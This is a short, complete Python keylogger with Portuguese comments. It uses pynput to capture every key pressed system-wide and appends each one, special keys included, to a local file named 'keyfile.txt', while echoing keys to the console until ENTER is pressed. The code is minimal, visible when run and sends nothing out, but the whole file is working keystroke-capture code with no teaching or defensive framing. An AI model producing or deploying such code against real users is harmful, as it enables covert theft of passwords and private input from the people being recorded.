from pynput import keyboard

def keyPressed(key):
    """
    Função chamada sempre que uma tecla é pressionada.
    Registra a tecla no arquivo 'keyfile.txt'.
    """
    print(str(key))

    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            # Algumas teclas não possuem representação direta (Shift, Ctrl, etc.)
            logKey.write(f'[{key}]')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    # Mantém o programa ativo
    input("Pressione ENTER para encerrar...\n")
